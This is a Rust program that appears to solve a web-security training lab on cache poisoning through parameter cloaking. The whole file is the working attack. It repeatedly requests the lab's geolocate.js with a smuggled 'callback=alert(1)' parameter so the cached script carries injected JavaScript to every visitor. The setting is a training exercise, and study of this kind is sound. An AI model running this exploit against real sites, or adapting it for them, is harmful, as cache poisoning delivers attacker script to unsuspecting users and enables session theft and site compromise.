/**********************************************************
*
* Lab: Parameter cloaking
*
* Hack Steps:
*      1. Inject payload as a second query parameter
*      2. Send multiple request to the geolocate.js file
*         to cache it with the injected payload
*
***********************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a13008e0321d2c9802b210800270075.web-security-academy.net";

fn main() {
    let payload = r###"utm_content=hack;callback=alert(1)%3bsetCountryCookie"###;

    // 5 times is enough for caching
    // 35 times to reach the max-age and start caching again (just to make sure that the request is cached to mark the lab as solved)
    for i in 1..=35 {
        print!("\r❯❯ Poisoning the geolocate.js file using parameter cloaking ({i}/35).. ");
        flush_terminal();

        poison_geolocate_js_file(payload);
    }

    println!("{}", "OK".green());
    println!(
        "🗹 The main page is poisoned successfully as it request the poisoned geolocate.js file"
    );
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn poison_geolocate_js_file(payload: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!(
            "{LAB_URL}/js/geolocate.js?callback=setCountryCookie&{payload}"
        ))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the geolocate.js file with the injected payload".red()
        ))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
